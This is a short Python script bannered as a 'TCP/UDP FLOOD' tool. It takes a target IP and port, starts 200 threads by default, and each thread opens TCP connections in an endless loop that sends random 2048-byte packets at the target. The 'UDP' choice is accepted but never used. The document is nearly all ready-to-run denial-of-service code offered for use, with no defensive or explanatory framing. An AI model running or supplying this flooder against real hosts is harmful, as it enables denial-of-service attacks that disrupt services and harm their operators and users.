#!/usr/bin/env python3
#Code by LeeOn123
import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", type=str, default="172.21.210.74", help="Host ip")
ap.add_argument("-p", "--port", type=int, default=2000,help="Port")
ap.add_argument("-c", "--choice", type=str, default="n", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=2000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=200, help="Threads")
args = vars(ap.parse_args())

print("--> C0de By Lee0n123 <--")
print("#-- TCP/UDP FLOOD --#")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(2048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()